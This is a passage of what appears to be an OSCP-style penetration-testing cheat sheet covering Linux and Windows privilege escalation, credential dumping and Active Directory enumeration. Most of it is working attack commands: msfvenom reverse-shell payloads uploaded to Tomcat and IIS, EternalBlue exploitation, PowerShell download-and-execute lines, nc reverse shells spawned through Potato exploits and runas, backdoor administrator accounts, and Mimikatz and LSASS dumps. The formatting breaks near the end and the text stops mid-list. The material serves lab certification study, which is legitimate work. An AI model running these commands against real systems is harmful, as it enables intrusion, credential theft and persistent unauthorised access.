> find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
> ```

#### ── Kernel Exploits (LAST RESORT) ────────────────────────────

> [!info] 🐧 Linux Bash: Ingress Mapping of Current Core Kernel Release Flags
> 
> Verifies the explicit build string numbers for the running system kernel prior to researching public exploit options.
> 
> Bash
> 
> Bash
> 
> ```
> uname -r
> ```

> [!check] 🐧 Linux Bash: Programmatic Local Database Query for Public Kernel Exploits Scripts
> 
> Queries the offline database repository for known privilege escalation code matching the isolated system version string.
> 
> Bash
> 
> Bash
> 
> ```
> searchsploit linux kernel $(uname -r | cut -d- -f1)
> ```

## Linux PrivEsc Decision Tree

> [!quote] 🌳 Logic Diagram: Linux System Local Privilege Elevation Sequence Mapping
> 
> Systematic workflow model for evaluating escalation options on a compromised Linux host.
> 
> Plaintext
> 
> ```
> sudo -l → Any NOPASSWD entries map?
>      └── Match with GTFObins commands → ROOT ✓
> 
> SUID permission binary found on storage?
>      ├── Matches standard known handler in GTFObins → ROOT ✓
>      ├── Custom in-house application binary → strings / ltrace analysis
>      └── Naked relative path execution call identified → inject path script → ROOT ✓
> 
> Extended file capabilities configured?
>      └── cap_setuid present on utility → invoke local setuid(0) wrapper → ROOT ✓
> 
> Writable crontab automation scripts detected?
>      └── Append custom reverse shell string or shell binary execution → ROOT ✓
> 
> Insecure wildcard execution inside backups (tar/rsync)?
>      └── Inject checkpoint options into storage directory → ROOT ✓
> 
> File writing permissions open on /etc/passwd?
>      └── Append custom username entry matched to uid 0 structure → ROOT ✓
> 
> Network storage export configured with no_root_squash?
>      └── Mount externally + inject custom owned SUID bash binary → ROOT ✓
> 
> Account maintains membership within the Docker group?
>      └── docker run -v /:/mnt → escape container via local chroot → ROOT ✓
> 
> Privileged service thread bound to loopback port (ss -tlnp)?
>      └── Establish tunnel link → execute exploit payload locally → ROOT ✓
> 
> All standard configurations secured? → Process specific kernel version exploit research
> ```

# STANDALONE WINDOWS BOX METHODOLOGY

## Decision Tree — Windows Initial Access

> [!abstract] 🌳 Logic Diagram: Windows Corporate Sub-System Entry Ingress Blueprint
> 
> Structured mapping for evaluating open ports, protocol properties, and entry points on a Windows host.
> 
> Plaintext
> 
> ```
> NMAP OUTPUT WINDOWS
> │
> ├── SMB (445)?
> │   ├── Null session bind → download directory list → inspect share configuration files
> │   ├── MS17-010 validation check → deliver EternalBlue shellcode → SYSTEM
> │   └── Valid Guest profile or credentials harvested downstream → PsExec / WMIExec execution
> │
> ├── Web (80/443/8080)?
> │   ├── Follow identical directory/extension fuzzing patterns as Linux
> │   ├── IIS server target? → inspect /aspnet_client permissions, test WebDAV extensions
> │   └── Tomcat environment? → authenticate to /manager/html → drop weaponized WAR container
> │
> ├── MSSQL (1433)?
> │   └── [PROCESS FULL DATABASE ESCALATION PIPELINE SEEN IN SEPARATE SECTION]
> │
> ├── WinRM (5985)?
> │   └── evil-winrm -i <TARGET_IP> -u user -p pass (or authenticate using NT strings)
> │
> ├── RDP (3389)?
> │   ├── Old host deployment check (Win7/2008) → validate BlueKeep crash state
> │   └── Account credentials available → launch desktop session via xfreerdp
> │
> └── FTP (21)?
>      └── Anonymous profiles open + write access + webroot location overlap → drop ASPX script
> ```

## Windows Initial Access Commands

> [!warning] 🐧 Linux Bash: Target Legacy Endpoint Null Session Vulnerability Scan (MS17-010)
> 
> Verifies if the target system is missing critical security patches for legacy SMBv1 processing.
> 
> Bash
> 
> Bash
> 
> ```
> nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Execution of Manual Shellcode Overrides for Legacy SMB Targets
> 
> Runs manual Python exploit frameworks to inject kernel-level reverse shell payloads over raw SMB connections.
> 
> Bash
> 
> Bash
> 
> ```
> python3 ms17_010_shellcode.py <TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Creating Backdoor Tomcat Manager Deployment WAR Payloads
> 
> Packages a Java reverse shell into a standard Web Archive (WAR) container suitable for deployment via application server panels.
> 
> Bash
> 
> Bash
> 
> ```
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
> ```

> [!example] 🐧 Linux Bash: Delivering Backdoor WAR Archives through Inbound HTTP Put Methods
> 
> Uploads and triggers the weaponized WAR container directly against Tomcat administrative endpoints using discovered credentials.
> 
> Bash
> 
> Bash
> 
> ```
> curl -u admin:admin -T shell.war "http://<TARGET_IP>:8080/manager/text/deploy?path=/shell"
> curl http://<TARGET_IP>:8080/shell/
> ```

> [!check] 🐧 Linux Bash: Automated Scripted Inspection of Target WebDAV Endpoints Writable Status
> 
> Checks WebDAV web endpoints to identify permitted file creation operations and upload constraints.
> 
> Bash
> 
> Bash
> 
> ```
> davtest -url http://<TARGET_IP>
> cadaver http://<TARGET_IP>
> ```

> [!example] 🐧 Linux Bash: Generating Malicious ASPX Windows Architecture Ingress Web-Shell Payloads
> 
> Compiles a native ASPX reverse shell payload designed to execute within the context of IIS web server worker processes (`w3wp.exe`).
> 
> Bash
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f aspx -o shell.aspx
> ```

> [!example] 🐧 Linux Bash: Uploading Weaponized ASPX Vectors to Targets Writable Directories
> 
> Drops the generated script vector directly onto the remote web server via HTTP transfer methods.
> 
> Bash
> 
> Bash
> 
> ```
> curl -T shell.aspx http://<TARGET_IP>/uploads/shell.aspx
> ```

> [!example] 🐧 Linux Bash: Authenticated WinRM Remote Console Shell Access Connection
> 
> Connects to port 5985 to open an interactive PowerShell management session on the target system using valid credentials.
> 
> Bash
> 
> Bash
> 
> ```
> evil-winrm -i <TARGET_IP> -u Administrator -p 'Password123'
> ```

> [!example] 🐧 Linux Bash: Authenticated WinRM Remote Access via Discovery NT Hashes Strings
> 
> Bypasses the need for plaintext passwords by authenticating over WinRM using an NTLM hash string (Pass-the-Hash).
> 
> Bash
> 
> Bash
> 
> ```
> evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>
> ```

## Windows Privilege Escalation Checklist

### STEP 1 — AUTOMATED

> [!abstract] 🐧 Linux Bash: Attacker Web Delivery Platform Launch Operations
> 
> Spins up an HTTP server instance to host Windows privilege evaluation binaries and data gathering scripts.
> 
> Bash
> 
> Bash
> 
> ```
> python3 -m http.server 80
> ```

> [!check] 💾 Windows CMD: Requesting Remote Executables Downloads and Local Output Logs Pipe Scripts
> 
> Uses PowerShell to download and execute winPEAS to automatically find privilege escalation vectors on the host.
> 
> DOS
> 
> DOS
> 
> ```
> powershell -c "Invoke-WebRequest http://<LHOST>/winPEASany.exe -OutFile C:\Windows\Temp\wp.exe"
> C:\Windows\Temp\wp.exe > C:\Windows\Temp\out.txt 2>&1
> type C:\Windows\Temp\out.txt
> ```

> [!check] 🪟 PowerShell: Automated Scripted Registry, Service, and System Permissions Ingress Audit
> 
> Bypasses local script execution restrictions to run PowerUp, checking for common misconfigurations like vulnerable services and path flaws.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1'); Invoke-AllChecks"
> ```

### STEP 2 — MANUAL CHECKS

#### ── Context ─────────────────────────────────────────────────

> [!info] 💾 Windows CMD: Query Account Token Privileges and System Groups Assignments Registry Maps
> 
> Displays current user group memberships, safety flags, and active token privileges (such as `SeImpersonatePrivilege`).
> 
> DOS
> 
> DOS
> 
> ```
> whoami /all          # Full token + privileges mapping — evaluate these closely
> ```

> [!info] 💾 Windows CMD: Extracting System Environment Blueprints, Architecture, and Operational Metrics
> 
> Pulls system information, kernel build properties, hardware metrics, and hotfix tracking logs to map out missing patches.
> 
> DOS
> 
> DOS
> 
> ```
> systeminfo           # Details system properties and missing security KBs
> wmic qfe list brief  # Lists all installed Windows update patches
> ```

#### ── Token Privileges (Check whoami /priv output) ────────────────────

> [!example] 💾 Windows CMD: Token Privilege Impersonation over Native Operating Assemblies (SeImpersonate Core)
> 
> Abuses impersonation privileges via GodPotato to execute commands directly within the context of the elevated NT AUTHORITY\SYSTEM account.
> 
> DOS
> 
> DOS
> 
> ```
> .\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\proof.txt"
> ```

> [!example] 💾 Windows CMD: Injecting Persistent Local Admin User Entities via Elevated Impersonation Handles
> 
> Uses token privileges to inject a new user into the local administrators group.
> 
> DOS
> 
> DOS
> 
> ```
> .\GodPotato-NET4.exe -cmd "cmd /c net user hax Password123! /add && net localgroup administrators hax /add"
> ```

> [!example] 💾 Windows CMD: Generating High-Privilege Local Process Call Handles inside PrintSpoofer Exploitations
> 
> Exploits named-pipe print spooler flaws to execute command lines or spawn reverse shells as SYSTEM.
> 
> DOS
> 
> DOS
> 
> ```
> .\PrintSpoofer64.exe -i -c "cmd /c whoami"
> .\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> 4444 -e cmd"
> ```

> [!example] 💾 Windows CMD: Accessing elevated SYSTEM Context Threads via Alternative Ingress Frameworks
> 
> Uses JuicyPotatoNG to exploit COM server configuration errors, redirecting authentication processes to spawn privileged shell handlers.
> 
> DOS
> 
> DOS
> 
> ```
> .\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\nc.exe" -a "<LHOST> 4444 -e cmd"
> ```

> [!example] 💾 Windows CMD: Harvesting Active System Account Registry Hive Backup Databases (SeBackup Vector)
> 
> Abuses backup privileges to export protected system registry files to extract local user password hashes offline.
> 
> DOS
> 
> DOS
> 
> ```
> reg save HKLM\SAM C:\Temp\SAM
> reg save HKLM\SYSTEM C:\Temp\SYSTEM
> reg save HKLM\SECURITY C:\Temp\SECURITY
> ```

> [!check] 🐧 Linux Bash: Remote Decryption of Local Registry Hives Database Secrets
> 
> Parses the harvested registry files on the attacker platform to decrypt and dump the stored local NTLM password hashes.
> 
> Bash
> 
> Bash
> 
> ```
> secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
> ```

#### ── Services ────────────────────────────────────────────────

> [!note] 💾 Windows CMD: Global Querying of Running Processes for Unquoted Service Paths Vulnerabilities
> 
> Scans service configurations to catch unquoted executable path definitions that contain spaces, exposing local path hijack options.
> 
> DOS
> 
> DOS
> 
> ```
> wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"
> ```

> [!check] 💾 Windows CMD: Identifying Weak Security Permissions and Modification Access over Active Services
> 
> Audits user security profiles to find active service definitions that permit low-privilege accounts to rewrite file paths or configurations.
> 
> DOS
> 
> DOS
> 
> ```
> accesschk.exe -uwcqv * /accepteula 2>nul | findstr "RW\|WD"
> ```

> [!example] 💾 Windows CMD: Swapping Service Executables to Trigger Elevated Backdoor Shell Processing
> 
> Overwrites a targeted service executable with a custom shell binary, starting the service to trigger administrative code execution.
> 
> DOS
> 
> DOS
> 
> ```
> sc stop <SERVICE_NAME>
> copy shell.exe "C:\path\to\service.exe"
> sc start <SERVICE_NAME>
> ```

> [!check] 💾 Windows CMD: Querying Target Users Service Manipulation Permission Mappings
> 
> Checks the explicit access rights and service modification tokens held by a specific user profile on the host.
> 
> DOS
> 
> DOS
> 
> ```
> accesschk.exe -uwcqv "<USERNAME>" * /accepteula
> ```

> [!example] 💾 Windows CMD: Overriding Weak Service Configuration Paths for Local Admin Group Escalation Loops
> 
> Rewrites the binary path configuration (`binpath`) of a vulnerable service to add a backdoor account to the local administrators group.
> 
> DOS
> 
> DOS
> 
> ```
> sc config <SERVICE_NAME> binpath= "cmd /c net user hax Pass123! /add"
> sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
> sc config <SERVICE_NAME> binpath= "cmd /c net localgroup administrators hax /add"
> sc stop <SERVICE_NAME> && sc start <SERVICE_NAME>
> ```

#### ── Registry ────────────────────────────────────────────────

> [!check] 💾 Windows CMD: Auditing Registry Flag Keys for Arbitrary Installer Packages Elevation Streaks
> 
> Queries the registry to see if the `AlwaysInstallElevated` flag is enabled, allowing installation packages to run with system authority.
> 
> DOS
> 
> DOS
> 
> ```
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> ```

> [!example] 🐧 Linux Bash: Crafting Malicious Installation Database Packages for Registry Privilege Exploitations
> 
> Compiles an installation package (.msi) containing an embedded reverse shell payload targeted at elevated registry installers.
> 
> Bash
> 
> Bash
> 
> ```
> msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f msi -o evil.msi
> ```

> [!example] 💾 Windows CMD: Executing Backdoor Installation Suites Silently to Force Elevated Code Operations
> 
> Triggers the elevated installation package silently to bypass graphical menus and drop directly into an elevated shell.
> 
> DOS
> 
> DOS
> 
> ```
> msiexec /quiet /qn /i C:\Temp\evil.msi
> ```

> [!note] 💾 Windows CMD: Interrogating Core Current Version Winlogon Registries for Stored Passwords
> 
> Extracts plaintext administrative passwords cached inside the Windows Winlogon registry keys.
> 
> DOS
> 
> DOS
> 
> ```
> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
> ```

> [!note] 💾 Windows CMD: Global Traversal Search of Registry Sub-Keys Databases for Password Text
> 
> Searches the local registry hives to extract plain text passwords stored within application keys.
> 
> DOS
> 
> DOS
> 
> ```
> reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
> reg query HKCU /f password /t REG_SZ /s 2>nul
> ```

#### ── Scheduled Tasks ─────────────────────────────────────────

> [!check] 💾 Windows CMD: Detailed Enumeration of Scheduled Background Administrative Scripts Processes
> 
> Lists active scheduled tasks, service execution properties, user account scopes, and associated scripts running on the system.
> 
> DOS
> 
> DOS
> 
> ```
> schtasks /query /fo LIST /v | findstr /i "run as\|task name\|next run\|program"
> ```

#### ── Stored Credentials ──────────────────────────────────────

> [!note] 💾 Windows CMD: Query Vault Stored Security Profiles Credentials Token Collections
> 
> Harvests saved network profiles, application tokens, and domain login data cached via the Windows Credential Manager.
> 
> DOS
> 
> DOS
> 
> ```
> cmdkey /list
> ```

> [!example] 💾 Windows CMD: Processing Arbitrary Command Threads under Saved Stored Runas Privileges Contexts
> 
> Leverages saved credentials inside the vault to spawn processes or run reverse shells as an elevated administrator profile.
> 
> DOS
> 
> DOS
> 
> ```
> runas /savecred /user:<DOMAIN>\<USER> "cmd.exe /c whoami > C:\Temp\w.txt"
> runas /savecred /user:Administrator "C:\Temp\nc.exe <LHOST> 4444 -e cmd"
> ```

#### ── DLL Hijacking ───────────────────────────────────────────

> [!check] 🪟 PowerShell: Auditing System Environment PATH Directories for Writable Access Anomalies
> 
> Evaluates all file directory tracks listed in the system PATH environment variable to detect insecure write access that can be targeted for DLL hijacking.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> $env:PATH -split ";" | % { if (Test-Path $_) { (Get-Acl $_).Access } }
> ```

#### ── Interesting Files ────────────────────────────────────────

> [!note] 🪟 PowerShell: Mining Local Console Interactive Session Command Logs for Hardcoded Access Keys
> 
> Extracts the plaintext command history of the PowerShell host to uncover passwords entered during command-line operations.
> 
> PowerShell
> 
> PowerShell
> 
> ```
> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
> ```

> [!note] 💾 Windows CMD: Tracking Hardcoded Database Accounts Password Strings inside Local App Config Partitions
> 
> Direct parsing of standard server files, configuration stores, and local environment scripts to locate plaintext credentials.
> 
> DOS
> 
> DOS
> 
> ```
> type C:\inetpub\wwwroot\web.config
> type C:\xampp\passwords.txt
> type C:\xampp\apache\conf\httpd.conf
> ```

> [!note] 💾 Windows CMD: Comprehensive Extension Tracking Keyword Search across Storage Volumes Directories
> 
> Traverses system disk drives to locate document names, text notes, or configuration properties that match credential keywords.
> 
> DOS
> 
> DOS
> 
> ```
> dir /s /b C:\*.txt C:\*.xml C:\*.conf C:\*.config C:\*.ini 2>nul | findstr /i "pass cred secret"
> dir /s /b C:\Users\ 2>nul | findstr /i "password\|creds\|credentials\|secret"
> ```

> [!note] 💾 Windows CMD: Reviewing Automated Deployment Configurations Blueprint Manifest Files for Plaintext Secrets
> 
> Parses legacy system files used in unattended imaging routines to extract plaintext passwords left over from configuration tasks.
> 
> DOS
> 
> DOS
> 
> ```
> type C:\Windows\Panther\unattend.xml
> type C:\Windows\system32\sysprep\sysprep.xml
> type C:\Windows\system32\sysprep\sysprep.inf
> ```

## Dump Credentials (Windows Post-Exploitation)

> [!check] 💾 Windows CMD: Interactive Local Memory Ingestion and Security Support Accounts Hashing Extractions
> 
> Launches Mimikatz with debug rights to read plaintext credentials, NTLM hashes, and active Kerberos tickets from local memory.
> 
> DOS
> 
> DOS
> 
> ```
> .\mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords       # Extracts cleartext passwords and NTLM hashes
> sekurlsa::wdigest              # Pulls cleartext values from legacy targets
> lsadump::sam                   # Decrypts local account registry databases
> lsadump::lsa /patch            # Extracts hidden core system secrets
> lsadump::cache                 # Pulls domain credential cache records
> sekurlsa::credman              # Extracts cached vault profile passwords
> ```

> [!example] 💾 Windows CMD: Evasive non-Interactive Target LSASS Memory Space Dumps Processes Creation
> 
> Dumps the live memory footprint of the LSASS process to an external file using Sysinternals tools to bypass standard endpoint detection.
> 
> DOS
> 
> DOS
> 
> ```
> procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
> ```

> [!check] 🐧 Linux Bash: Offline Parsing of Process Memory Dumps Containers for Account Hashes
> 
> Parses the extracted LSASS memory dump offline on the attacker platform to harvest hashed account credentials securely.
> 
> Bash
> 
> Bash
> 
> ```
> pypykatz lsa minidump lsass.dmp
> ```

> [!check] 🐧 Linux Bash: Remote Ingress Extraction of Local Accounts Database Registries Mapping via Networks
> 
> Connects over SMB to remotely pull registry hashes or launch memory collection tools using valid administrative rights.
> 
> Bash
> 
> Bash
> 
> ```
> secretsdump.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>
> secretsdump.py -hashes <LM_HASH>:<NTLM_HASH> <DOMAIN>/<USER>@<TARGET_IP>
> netexec smb <TARGET_IP> -u user -p pass --sam
> netexec smb <TARGET_IP> -u user -p pass -M lsassy
> ```

> [!check] 🐧 Linux Bash: Extracting Corporate Active Directory Network Hashes Database Configurations
> 
> Decrypts and parses offline copies of the primary Active Directory database (`ntds.dit`) using system hive keys to dump the entire forest keyspace.
> 
> Bash
> 
> Bash
> 
> ```
> impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
> ```

## Windows PrivEsc Decision Tree

> [!quote] 🌳 Logic Diagram: Windows Operating System Local Privilege Elevation Path Strategy Mapping
> 
> Systematic validation pipeline used to progress from a standard Windows shell up to full SYSTEM control.
> 
> Plaintext
> 
> ```
> whoami /priv privileges check → SeImpersonatePrivilege or SeAssignPrimaryToken active?
>      └── Deploy Potato family frameworks (GodPotato / PrintSpoofer / JuicyPotatoNG) → SYSTEM ✓
> 
> whoami /priv privileges check → SeBackupPrivilege active?
>      └── reg save SAM/SYSTEM/SECURITY hives → secretsdump remote processing → Pass-the-Hash → SYSTEM ✓
> 
> AlwaysInstallElevated policies active within HKLM + HKCU registry profiles?
>      └── msiexec execution mapping targeting a malicious installation .msi package → SYSTEM ✓
> 
> Unquoted service path discovered containing a writable intermediate path directory?
>      └── Drop custom binary payload matched to the unquoted string breakpoint → restart service → SYSTEM ✓
> 
> Weak modifications rights open across service file allocations or configuration objects?
>      └── Replace binary or modify sc config path parameters → restart service → SYSTEM ✓
> 
> Stored profiles cached within cmdkey vault lists?
>      └── Execute runas /savecred mapping targeting administrative user context shells → Higher privilege shell ✓
> 
> Plaintext administrative auto-login variables saved inside registry strings?
>      └── Extract credentials → execute lateral verification across network targets ✓
> 
> Writable automation script associated with a SYSTEM scheduled task?
>      └── Modify script content strings → trigger validation cycle manually or wait for execution → SYSTEM ✓
> 
> Local PowerShell command line history files contain plain text passwords?
>      └── Extract secrets → map network parameters via Pass-the-Hash or WinRM connections ✓
> 
> Secure standard configurations maintained? → Cross-reference systeminfo build hotfixes with known patch CVEs
> ```

# ACTIVE DIRECTORY ATTACK CHAINS

## ⚠️ CRITICAL: OSCP AD SET IS ASSUMED BREACH

> [!warning] **AD Set Infrastructure Boundary Target Information Reference**
> 
> Operational target profile documenting the domain controllers, domain namespaces, and verified initial credentials.
> 
> Plaintext
> 
> ```
> Domain Target:     CORP.LOCAL
> Active DC IP:      192.168.x.100
> Entry Node MS01:   192.168.x.101  (Foothold system — reverse shell caught here)
> Internal Node MS02: 10.10.10.50    (Isolated internal asset — requires pivoting from MS01)
> Low-Priv User:     stephanie
> Access Password:   Password123
> ```

## AD Attack Chain — Full Flow

> [!abstract] 🌳 Logic Diagram: Enterprise Active Directory Lifecycle Chain Attack Sequences Flow
> 
> Step-by-step methodology for executing an Active Directory domain compromise starting from low-privilege access.
> 
> Plaintext
> 
> ```
> PROVIDED INITIAL DOMAIN CREDS (stephanie:Password123)
>          │
>          ▼
> Phase 1: RAPID SYSTEMATIC AD ENUMERATION
>          Map structures via BloodHound, query properties over SMB with NetExec, list objects over LDAP
>          │
>          ▼
> Phase 2: CONFIGURATION ATTACKS & QUICK WINS (Execute all vectors concurrently)
>          ├── AS-REP Roasting (Accounts lacking pre-auth requirements)
>          ├── Kerberoasting (Extract service ticket hashes matching targeted SPN names)
>          ├── Parsing account descriptions attributes for plaintext password strings
>          ├── Harvesting exposed deployment scripts across open corporate shares
>          └── Extracting cpassword variables out of GPP policy XML files within SYSVOL
>          │
>          ▼
> Phase 3: ELEVATING FOOTHOLD ON LOCAL SYSTEMS (Capture local user flag)
>          Apply standalone privilege escalation tactics on MS01 to capture administrative memory states
>          │
>          ▼
> Phase 4: SUB-NET ROUTING & LATERAL MOVEMENT (Pivot context to internal zone)
>          Establish tunnel infrastructure through MS01 -> target internal node MS02 via harvested credentials
>          │
>          ▼
> Phase 5: RESTRUCTURING DOMAIN OBJECT ACCESS (Escalate token context to Domain Admin)
>          Abuse delegation rules, modify structural object ACLs, or invoke DCSync database updates
>          │
>          ▼
> Phase 6: ABSOLUTE DC CONTROL (Capture root domain flag)
>          Connect to the DC as a Domain Admin -> dump NTDS database -> establish a Golden Ticket for persistence
> ```

## Phase 1: AD Enumeration with Provided Creds

> [!check] 🐧 Linux Bash: Remote Automated Active Directory Domain Trust Mapping Ingestion
> 
> Connects over LDAP to map user objects, system links, domain groups, and access permissions into a format ready for BloodHound analysis.
> 
> Bash
> 
> Bash
> 
> ```
> bloodhound-python -u stephanie -p 'Password123' -d corp.local -ns 192.168.x.100 -c All --zip
> ```

> [!check] 💾 Windows CMD: In-Network Active Directory Object Relational Mapping Discovery
> 
> Runs the native C# ingestor directly from an active target session to gather domain object attributes and access lists.
> 
> DOS
> 
> DOS
> 
> ```
> .\SharpHound.exe -c All --domain corp.local --zipfilename bh.zip
> ```

> [!check] 🐧 Linux Bash: Mapping Shared Directories and Password Execution Policies via Native Credentials
> 
> Queries domain controllers to check share permissions, verify user lists, and review password policy metrics.
> 
> Bash
> 
> Bash
> 
> ```
> crackmapexec smb 192.168.x.100 -u stephanie -p 'Password123' --shares --users --groups --pass-pol
> netexec smb 192.168.x.100 -u stephanie -p 'Password123' --users --rid-brute
> ```

> [!check] 🐧 Linux Bash: Interrogating LDAP Directory Trees for User Objects Schema Configuration Profiles
> 
> Queries the LDAP directory to return user accounts, group memberships, and security parameters held within the domain tree.
> 
> Bash
> 
> Bash
> 
> ```
> ldapsearch -x -H ldap://192.168.x.100 -D "stephanie@corp.local" -w 'Password123' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
> #search for guid
ldapsearch -x -H ldap://172.16.5.5 -D "sqldev@inlanefreight.local" -w 'database!' -b "DC=inlanefreight,DC=local" "(&(objectClass=user)(sAMAccountName=forend))" sAMAccountName description objectGUID
> ```


>[!check] ⚙️ Active Directory Tool Execution Suite
```
> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups
> ```
> 💡 **What it does:** Lists all security groups within Active Directory and shows how many members are in each.
> 
> ✔ *Pentester Value:* Helps pinpoint high-value target groups like Domain Admins or IT Admins.

---

## 🕵️ Session & Storage Hunting

---

> [!check] 🐧 Linux Bash: Hunt for Live Active Logged-On User Sessions on a Target Host
> 
```bash
> sudo nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
> ```
> 💡 **What it does:** Queries the specified server to find out who is actively logged on. 
> 
> ✔ *Pentester Value:* Locates high-value targets (e.g., Domain Admins) logged into network assets. If it prints **`(Pwn3d!)`**, your account has local administrator rights on that machine.

---

> [!check] 🐧 Linux Bash: Remote Share Permissions Enumeration (READ/WRITE Access Audit)
> 
```bash
> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares
> ```
> 💡 **What it does:** Scans the target host for exposed network shares and reports authorization levels.
> 
> ✔ *Pentester Value:* Instantly identifies if your authenticated context has `READ` or `WRITE` access to non-standard shares.

---

> [!check] 🐧 Linux Bash: Automated Directory Spidering and Asset Inventory Mapping
> 
```bash
> sudo nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
> ```
> 💡 **What it does:** Crawls every readable file and folder inside the specified share, logging an exact structural map of the data to local storage.
> 
> ✔ *Pentester Value:* Automates data pillaging to find sensitive files.

---

> [!note] 🐧 Linux Bash: Read Parsed Spider JSON Output
> 
```bash
> cat /tmp/cme_spider_plus/172.16.5.5.json | head -n 20
> ```
> 💡 **What it does:** Displays the first 20 lines of the spidered log output.
> 
> ✔ *Pentester Value:* Allows you to quickly hunt for interesting files like scripts, backups, or configuration files containing credentials.

---

## 📁 SMBMap
### File System & Permission Replay

---

> [!info] 🐧 Linux Bash: Enumerate Global Share Access Levels
> 
```bash
> smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
> ```
> 💡 **What it does:** Interrogates the target host over SMB to list available storage volumes and maps out user permission grids.

---

> [!check] 🐧 Linux Bash: Advanced Recursive Multi-Threaded Directory-Only Listing
> 
```bash
> smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
> ```
> 💡 **What it does:** Recursively lists all subfolders within a share while completely ignoring loose files.
> 
> ✔ *Pentester Value:* Gives a clean look at the structural directory layout.

---

## 🔗 rpcclient
### Low-Level RPC Querying

---

> [!info] 🐧 Linux Bash: Establish Authenticated Interactive MS-RPC Pipe Session
> 
```bash
> rpcclient -U "forend" --password "Klmcargo2" 172.16.5.5
> ```
> 💡 **What it does:** Opens an interactive remote session shell using Microsoft's RPC endpoint protocol to perform granular domain architecture testing queries.

---

> [!success] 💬 rpcclient: Enumerate All Domain Users and RIDs Natively
> ```text
> rpcclient $> enumdomusers
> ```
> 💡 **What it does:** Prints out every user account registered in the domain alongside their hex Relative Identifiers (RIDs).

---

> [!success] 💬 rpcclient: Interrogate Specific Account Schema Metadata by Hex RID
> ```text
> rpcclient $> queryuser 0x457
> ```
> 💡 **What it does:** Extracts detailed structural metadata for a single account using its specific RID token.
> 
> ✔ *Pentester Value:* Reveals account metadata, password expiration thresholds, bad password attempt histories, and structural group associations.

---

## 🐍 Impacket Suite
### Remote Code Execution (RCE)

---

> [!warning] 🐧 Linux Bash: Spawning Interactive Remote Process Terminals as SYSTEM via ADMIN$
> ```bash
> psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
> ```
> 💡 **What it does:** Uploads a random binary service payload to the host's `ADMIN$` partition and executes it over a named pipe interface.
> 
> ✔ *Pentester Value:* Hands you an interactive remote shell prompt running under the highest local privilege context: **`NT AUTHORITY\SYSTEM`**.

---

> [!warning] 🐧 Linux Bash: Semi-Interactive Fileless Remote Console Command Execution via WMI
> 
```bash
> wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
> ```
> 💡 **What it does:** Executes commands remotely on the machine utilizing Windows Management Instrumentation (WMI).
> 
> ✔ *Pentester Value:* Runs entirely in memory without writing files to disk, leaving a smaller footprint on target storage.

---

## 🌬️ windapsearch
### Target-Focused LDAP Mining

---

> [!check] 🐧 Linux Bash: Enumerate Domain Admins Group Members via LDAP Queries
> 
```bash
> python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
> ```
> 💡 **What it does:** Queries the Active Directory database over LDAP to extract and isolate all users assigned to the Domain Admins security group.

---

> [!check] 🐧 Linux Bash: Recursive Search for Privileged Users with Nested Group Membership
> 
```bash
> python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
> ```
> 💡 **What it does:** Performs deep, multi-layered lookups across common structural admin groups.
> 
> ✔ *Pentester Value:* Uncovers hidden avenues of exposure where standard users inherit administrative domain rights via nested group links.

---

## 🩸 bloodhound-python
### Graph Theory Attack Path Ingestion

---

> [!success] 🐧 Linux Bash: Remote Automated Active Directory Object Relationship Ingestion
> 
```bash
> sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
> ```
> 💡 **What it does:** Automatically maps out the entire Active Directory terrain by gathering users, computers, GPOs, trusts, and complex explicit ACL tables over LDAP.
> 
> ✔ *Pentester Value:* Packs everything into localized JSON files to expose complex graph attack paths.

---

> [!abstract] 🐧 Linux Bash: Consolidate Ingestor JSON Outputs into a Unified Archive
> 
```bash
> zip -r ilfreight_bh.zip *.json
> ```
> 💡 **What it does:** Compresses all the extracted directory database JSON structures into a single file payload, making it ready to upload into the BloodHound GUI layout.

---

> [!abstract] 🐧 Linux Bash: Spin Up Local Graph Database Backend Engine
> 
```bash
> sudo neo4j start
> change password
> install blood hound legacy
